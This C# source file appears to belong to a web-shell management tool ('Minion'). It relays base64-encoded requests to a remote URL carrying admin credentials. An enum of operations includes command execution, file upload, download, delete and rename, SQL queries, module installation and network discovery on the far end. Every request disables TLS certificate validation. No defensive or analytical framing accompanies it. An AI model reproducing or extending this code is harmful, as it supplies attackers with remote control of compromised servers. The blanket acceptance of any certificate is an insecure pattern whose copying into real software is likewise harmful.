using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Linq;
using System.Net;
using System.Web;
using System.Web.Script.Serialization;

namespace Minion.lib
{
    public class Main
    {
        public class InputDataClass
        {
            public string Url { get; set; }
            public string Password { get; set; }
            public string AdminUsername { get; set; }
            public string AdminPassword { get; set; }
            public int MethodNumber { get; set; }
            public Dictionary<string,object> MethodInput { get; set; }
        }

        public class ErrorClass
        {
            public ErrorClass(Exception ex)
            {
                Error = ex.ToString();
            }
            public string Error { get; set; }
        }

        public InputDataClass InputData { get; set; }
        public HttpContext CurrentContext { get; set; }

        public Main(InputDataClass inputData, HttpContext currentContext)
        {
            if (inputData != null)
            {
                InputData = inputData;
                InputData.Url = Utility.FromBase64(InputData.Url);
                InputData.Password = Utility.FromBase64(InputData.Password);
                InputData.AdminUsername = Utility.FromBase64(InputData.AdminUsername);
                InputData.AdminPassword = Utility.FromBase64(InputData.AdminPassword);
            }
            CurrentContext = currentContext;
        }

        public void Proxy(NameValueCollection param)
        {
            string ret = "Error : -";
            try
            {
                ret = SendRequest(InputData.Url, param);
            }
            catch (Exception e)
            {
                ret = "Error : " + e.Message;
            }
            ResponseAjax(ret);
        }

        public void ResponseAjax(object res)
        {
            var json = new JavaScriptSerializer().Serialize(res);

            CurrentContext.Response.Clear();
            CurrentContext.Response.Write(Utility.ToBase64(json));
            CurrentContext.Response.Flush();
            CurrentContext.Response.SuppressContent = true;
            CurrentContext.ApplicationInstance.CompleteRequest();
        }

        public void ResponseAjax(string res)
        {
            ResponseAjax(new Dictionary<string,object>() { { "JustPrint", res } });
        }

        public enum Method
        {
            Auth = 0,
            Command = 1,
            Upload = 2,
            Uploadbase64 = 3,
            Delete = 4,
            Download = 5,
            ChangeTime = 6,
            SqlQuery = 7,
            Explorer = 8,
            GetSize = 9,
            GetLocation = 10,
            Rename = 11,
            Copy = 12,
            View = 13,
            CommandAjax = 14,
            DownloadTest = 15,
            CheckModules = 16,
            InstallModule = 17,
            UninstallModule = 18,
            Cmd7z = 19,
            AuthAjax = 20,
            GetLocationAjax = 21,
            SpyCheck = 22,
            LocalExplore = 23,
            MultiDelete = 24,
            CheckDownloadProgress = 25,
            GetIPFromNbt = 26,
            GetLogicDrives = 27,
            NetworkDownloaderCheck = 28,
            NetworkDownloaderLog = 29,
            NetworkDownloaderError = 30,
            NetworkDownloaderDone = 31,
            NetworkDownloaderDir = 32,
            SaveLog = 33,
            DownloadDemo = 34,
            DownloadPause = 35,
            DownloadInfo = 36,
            DownloadLoad = 37,
            DownloadClose = 38,
            DownloadChangeStatusToRequested = 39
        };

        public string SendRequest(string url, NameValueCollection values)
        {
            string response = string.Empty;

            string param = string.Empty;

            foreach (var item in values.AllKeys)
            {
                if (!string.IsNullOrEmpty(param))
                    param += "&";
                param += item + "=" + System.Web.HttpUtility.UrlEncode(Utility.ToBase64(values[item]));
            }

            using (WebClient wc = new WebClient())
            {
                ServicePointManager.ServerCertificateValidationCallback = (a, b, c, d) => true;
                wc.Headers[HttpRequestHeader.ContentType] = "application/x-www-form-urlencoded";
                response = Utility.FromBase64(wc.UploadString(url, param));
            }

            return response;
        }
    }
}